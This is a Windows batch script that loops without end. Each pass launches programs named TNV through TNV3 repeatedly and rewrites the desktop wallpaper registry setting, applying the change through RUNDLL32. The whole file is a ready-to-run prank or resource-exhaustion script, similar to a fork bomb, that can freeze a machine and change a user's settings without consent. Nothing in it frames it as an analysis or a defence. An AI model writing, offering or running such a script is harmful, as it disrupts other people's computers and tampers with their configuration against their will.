@echo off
color 4
:loop
start TNV start TNV1 start TNV2 start TNV3 start TNV start TNV1 start TNV2 start TNV3 start TNV start TNV1 start TNV2 start TNV3 start TNV start TNV1 start TNV2 start TNV3
reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d  %userprofile%\desktop\picture.jpg /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
goto loop 
